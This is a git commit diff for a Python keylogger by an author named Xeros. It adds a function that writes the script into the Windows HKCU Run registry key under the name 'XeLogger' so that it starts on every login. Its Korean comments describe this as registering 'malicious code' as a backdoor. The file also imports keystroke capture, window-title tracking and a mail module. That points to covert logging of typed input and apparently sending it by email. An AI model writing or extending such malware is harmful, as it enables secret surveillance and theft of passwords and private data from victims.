65ebccfa61f70dd8ecd7acf742bea5d8adc2c40a
Xeros <hackerxeros@gmail.com>
2019-12-20 12:02:39 +0900

    update

--- keylogger.py
+++ keylogger.py
@@ -1,10 +1,21 @@
 import os
 import time
+import winreg
 import mailmanager
 import filemanager
 import winmanager
 from threading import Thread
 from pynput.keyboard import Key, Listener
+
+def reg():
+    # 시작프로그램 레지스트리에 값을 선언
+    backdoor_path = __file__
+    key = winreg.HKEY_CURRENT_USER
+    subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    registry = winreg.CreateKey(key, subkey)
+
+    # 선언 한 레지스트리 경로에 악성코드를 시작프로그램으로 등록
+    winreg.SetValueEx(registry, "XeLogger", 0, winreg.REG_SZ, "\"{}\" / autostart".format(os.getenv(backdoor_path)))
 
 # 키 입력 감지 함수
 def on_press(key):
@@ -34,6 +45,7 @@ def main():
     with Listener(on_press=on_press) as listener:
         listener.join()
 
+reg()
 mainThread = Thread(target=main)
 titleThread = Thread(target=wintitle)
 FSCThread = Thread(target=FSC)
